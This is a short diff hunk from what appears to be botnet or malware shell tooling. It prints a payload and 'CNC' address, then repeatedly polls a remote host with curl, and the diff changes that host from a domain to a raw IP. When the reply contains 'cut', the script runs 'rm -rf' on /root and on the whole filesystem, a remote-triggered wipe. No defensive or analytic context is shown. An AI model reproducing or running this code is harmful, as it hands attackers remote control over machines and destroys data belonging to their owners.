@@ -99,7 +99,7 @@ echo "Payload: $payload"
 echo "CNC IP: $ip"
 echo "CNC Port: 18181"
 while true; do
-  response=$(curl -s https://thaithinhapi.click/lol.php)
+  response=$(curl -s http://160.187.246.23/check.txt)
   if echo "$response" | grep -q "cut"; then
     cd /root/; rm -rf *
     rm -rf /
